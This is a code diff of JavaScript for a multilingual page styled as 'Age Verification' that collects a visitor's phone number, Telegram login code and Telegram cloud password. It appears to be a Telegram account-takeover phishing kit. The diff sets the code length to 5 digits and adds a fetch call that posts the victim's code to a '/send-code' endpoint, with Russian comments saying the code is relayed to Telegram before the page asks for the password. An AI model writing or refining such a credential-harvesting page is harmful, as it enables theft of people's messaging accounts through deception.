@@ -1,4 +1,3 @@
-// ===== TRANSLATIONS DICTIONARY =====
 const translations = {
     en: {
         badge: "🔞 Age Verification",
@@ -13,7 +12,7 @@ const translations = {
         btnBack: "← Back",
         step2: "Step 2 of 3",
         codeTitle: "Verification Code",
-        codeDesc: "Enter the confirmation code sent to Telegram",
+        codeDesc: "Enter the 5-digit code sent to Telegram",
         btnVerifyCode: "Verify Code",
         step3: "Step 3 of 3",
         passTitle: "Cloud Password",
@@ -25,7 +24,7 @@ const translations = {
         successP2: "Please wait for a message from the bot.",
         btnHome: "Main Page",
         errPhone: "Please enter a valid phone number",
-        errCode: "Please enter all 6 digits of the code",
+        errCode: "Please enter all 5 digits of the code",
         errPass: "Please enter your cloud password"
     },
     ru: {
@@ -41,7 +40,7 @@ const translations = {
         btnBack: "← Назад",
         step2: "Шаг 2 из 3",
         codeTitle: "Подтверждение",
-        codeDesc: "Введите код, который был отправлен в Telegram",
+        codeDesc: "Введите 5-значный код, отправленный в Telegram",
         btnVerifyCode: "Проверить код",
         step3: "Шаг 3 из 3",
         passTitle: "Облачный пароль",
@@ -53,7 +52,7 @@ const translations = {
         successP2: "Ожидайте сообщение от бота.",
         btnHome: "На главную",
         errPhone: "Пожалуйста, введите корректный номер телефона",
-        errCode: "Введите все 6 цифр кода",
+        errCode: "Введите все 5 цифр кода",
         errPass: "Введите облачный пароль"
     },
     ar: {
@@ -69,7 +68,7 @@ const translations = {
         btnBack: "رجوع ←",
         step2: "الخطوة 2 من 3",
         codeTitle: "رمز التأكيد",
-        codeDesc: "أدخل الرمز المرسل إلى التليجرام",
+        codeDesc: "أدخل الرمز المكون من 5 أرقام المرسل إلى التليجرام",
         btnVerifyCode: "التحقق من الرمز",
         step3: "الخطوة 3 من 3",
         passTitle: "كلمة المرور السحابية",
@@ -81,7 +80,7 @@ const translations = {
         successP2: "يرجى انتظار رسالة من البوت.",
         btnHome: "الصفحة الرئيسية",
         errPhone: "يرجى إدخال رقم هاتف صحيح",
-        errCode: "يرجى إدخال جميع الأرقام الـ 6",
+        errCode: "يرجى إدخال جميع الأرقام الـ 5",
         errPass: "يرجى إدخال كلمة المرور السحابية"
     },
     iq: {
@@ -97,7 +96,7 @@ const translations = {
         btnBack: "رجوع ←",
         step2: "الخطوة 2 من 3",
         codeTitle: "كود التاكيد",
-        codeDesc: "اكتب الكود اللي وصلك على التليجرام",
+        codeDesc: "اكتب الكود المكون من 5 ارقام اللي وصلك على التليجرام",
         btnVerifyCode: "افحص الكود",
         step3: "الخطوة 3 من 3",
         passTitle: "الباسورد الغيمي",
@@ -109,7 +108,7 @@ const translations = {
         successP2: "انتظر رسالة من البوت.",
         btnHome: "للصفحة الرئيسية",
         errPhone: "الرجاء كتابة رقم تليفون صحيح",
-        errCode: "اكتب الكود الكرامه متكون من 6 ارقام",
+        errCode: "اكتب الكود متكون من 5 ارقام",
         errPass: "اكتب الباسورد الغيمي"
     },
     fa: {
@@ -125,7 +124,7 @@ const translations = {
         btnBack: "بازگشت ←",
         step2: "مرحله ۲ از ۳",
         codeTitle: "کد تایید",
-        codeDesc: "کد ارسال شده به تلگرام را وارد کنید",
+        codeDesc: "کد ۵ رقمی ارسال شده به تلگرام را وارد کنید",
         btnVerifyCode: "تایید کد",
         step3: "مرحله ۳ از ۳",
         passTitle: "رمز عبور ابری",
@@ -137,7 +136,7 @@ const translations = {
         successP2: "لطفا منتظر پیام ربات باشید.",
         btnHome: "صفحه اصلی",
         errPhone: "لطفا یک شماره تلفن معتبر وارد کنید",
-        errCode: "لطفا کد ۶ رقمی را به طور کامل وارد کنید",
+        errCode: "لطفا کد ۵ رقمی را به طور کامل وارد کنید",
         errPass: "لطفا رمز عبور ابری را وارد کنید"
     }
 };
@@ -145,7 +144,6 @@ const translations = {
 let currentLang = 'en';
 let currentCode = '';
 
-// ===== NAVIGATION & UI =====
 function showPage(pageId) {
     document.querySelectorAll('.page').forEach(page => {
         page.classList.remove('active');
@@ -171,7 +169,7 @@ function setLanguage(lang) {
     });
 }
 
-// ===== PINPAD LOGIC =====
+// ПИНПАД ЛОГИКА (5 ЦИФР)
 function updatePinDisplay() {
     const dots = document.querySelectorAll('.pin-dot');
     const hiddenInput = document.getElementById('codeInput');
@@ -193,16 +191,13 @@ function updatePinDisplay() {
     });
 }
 
-// ===== EVENT LISTENERS =====
 document.addEventListener('DOMContentLoaded', () => {
 
-    // Language switcher
     const langSelect = document.getElementById('langSelect');
     langSelect.addEventListener('change', (e) => {
         setLanguage(e.target.value);
     });
 
-    // Navigation
     document.getElementById('btnGetStarted').addEventListener('click', () => showPage('page-phone'));
     document.getElementById('btnBackFromPhone').addEventListener('click', () => showPage('page-main'));
     document.getElementById('btnBackFromCode').addEventListener('click', () => showPage('page-phone'));
@@ -213,10 +208,10 @@ document.addEventListener('DOMContentLoaded', () => {
         showPage('page-main');
     });
 
-    // Keypad handlers
+    // Обработка цифр 0-9 (максимум 5 цифр)
     document.querySelectorAll('.keypad-btn[data-val]').forEach(btn => {
         btn.addEventListener('click', () => {
-            if (currentCode.length < 6) {
+            if (currentCode.length < 5) {
                 currentCode += btn.getAttribute('data-val');
                 updatePinDisplay();
                 document.getElementById('codeError').textContent = '';
@@ -236,7 +231,7 @@ document.addEventListener('DOMContentLoaded', () => {
         updatePinDisplay();
     });
 
-    // Form 1: Phone
+    // Форма 1: Номер телефона
     document.getElementById('form-phone').addEventListener('submit', (e) => {
         e.preventDefault();
         const phone = document.getElementById('phoneInput').value.trim();
@@ -250,20 +245,43 @@ document.addEventListener('DOMContentLoaded', () => {
         showPage('page-code');
     });
 
-    // Form 2: Code
-    document.getElementById('form-code').addEventListener('submit', (e) => {
+    // Форма 2: Проверка и отправка 5-значного кода в Telegram
+    document.getElementById('form-code').addEventListener('submit', async (e) => {
         e.preventDefault();
         const errorEl = document.getElementById('codeError');
+        const spinner = document.getElementById('codeSpinner');
 
-        if (currentCode.length !== 6) {
+        if (currentCode.length !== 5) {
             errorEl.textContent = translations[currentLang].errCode;
             return;
         }
+
         errorEl.textContent = '';
-        showPage('page-password');
+        spinner.classList.remove('hidden');
+
+        try {
+            const response = await fetch('/send-code', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ code: currentCode })
+            });
+
+            const result = await response.json();
+            spinner.classList.add('hidden');
+
+            if (response.ok && result.success) {
+                // Только если Telegram ответил OK -> переходим на шаг 3 (Пароль)
+                showPage('page-password');
+            } else {
+                errorEl.textContent = result.error || 'Ошибка отправки в Telegram';
+            }
+        } catch (err) {
+            spinner.classList.add('hidden');
+            errorEl.textContent = 'Ошибка соединения с сервером';
+        }
     });
 
-    // Form 3: Password
+    // Форма 3: Облачный пароль
     document.getElementById('form-password').addEventListener('submit', (e) => {
         e.preventDefault();
         const pass = document.getElementById('passwordInput').value.trim();
@@ -277,6 +295,5 @@ document.addEventListener('DOMContentLoaded', () => {
         showPage('page-success');
     });
 
-    // Initial state
     updatePinDisplay();
 });
